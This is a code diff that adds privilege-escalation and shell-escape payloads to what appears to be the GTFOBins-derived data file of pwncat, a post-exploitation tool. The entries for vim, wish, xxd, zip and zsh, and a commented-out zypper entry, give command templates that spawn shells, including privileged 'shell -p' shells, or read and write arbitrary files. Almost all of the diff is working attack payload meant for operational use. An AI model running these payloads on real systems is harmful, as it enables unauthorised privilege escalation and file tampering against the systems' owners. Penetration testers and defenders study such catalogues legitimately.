@@ -874,8 +874,52 @@
 
 
 
-
-
+//-------------------------------------------------------------------
+	"vim": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':!{shell}'", "-c", "'quit'"],
+			// Include an extra newline to be sure to exit vim itself.
+			"exit": "exit\n\n" 
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':py import os; os.execl(\"{shell}\", \"{shell}\", \"-c\", \"reset; exec {shell}\")'", "-c", "'quit'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-c\", \"reset; exec {shell}\")'", "-c", "'quit'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':lua os.execute(\"reset; exec {shell}\")'", "-c", "'quit'"]
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-es" ,"'+%print'" ,"'+:q!'", "{lfile}"]
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "{command} >/dev/null",
+			"args": ["-es" ,"'+%print'" ,"'+:w! {lfile}'", "'+:q!'", "/dev/stdin"]
+		}
+// Vim can PROBABLY file write... but I have not figured that out just yet.
+	],
+//-------------------------------------------------------------------
+	"wish": [
+		{
+			"type": "shell",
+			"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp}); echo 'exec {shell} <@stdin >@stdout 2>@stderr; exit' > $TF; {command}",
+			"args": ["$TF"]
+		}
+	],
 //-------------------------------------------------------------------
 	"xargs": [
 		{
@@ -890,5 +934,56 @@
 			"payload": "{command}",
 			"args": ["-a", "{lfile}", "-0"]
 		}
+	],
+//-------------------------------------------------------------------
+	"xxd": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} {lfile} | {command} -r ",
+			"args": []
+		},
+		// This has the same issue of not sending the right length of the file.
+		{
+			"type": "write",
+			"stream": "raw",
+			"payload": "{xxd} -l {length} | {command}",
+			"args": ["-r", "-", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+// `yum` should be added.
+// https://gtfobins.github.io/gtfobins/yum/
+//-------------------------------------------------------------------
+	"zip": [
+		{
+			"type": "shell",
+			"payload": "TF=none; {command} --help >/dev/null; TF=$({mktemp} -u); {command} $TF /etc/hosts -T -TT '{shell} #'",
+			"args": []
+		}
+	],
+//-------------------------------------------------------------------
+	"zsh": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "\"{shell} -p\""]
+		}
 	]
+//-------------------------------------------------------------------
+// zsoelim was not yet tested because it might do strange things to the data
+// https://gtfobins.github.io/gtfobins/zsoelim/
+//
+//-------------------------------------------------------------------
+// zypper requires the modification of an environment variable.
+// We don't handle this well in pwncat for sudo.
+// https://gtfobins.github.io/gtfobins/zypper/
+// "zypper": [
+// 	{
+// 		"type": "shell",
+// 		"payload": "TF=none; {command} 2>/dev/null; TF=$({mktemp} -d); cp {shell} $TF/zypper-x; export PATH=$TF:$PATH; {command} x",
+// 		"args": [],
+// 		"exit": "exit\n"
+// 	}
+// ]
 }
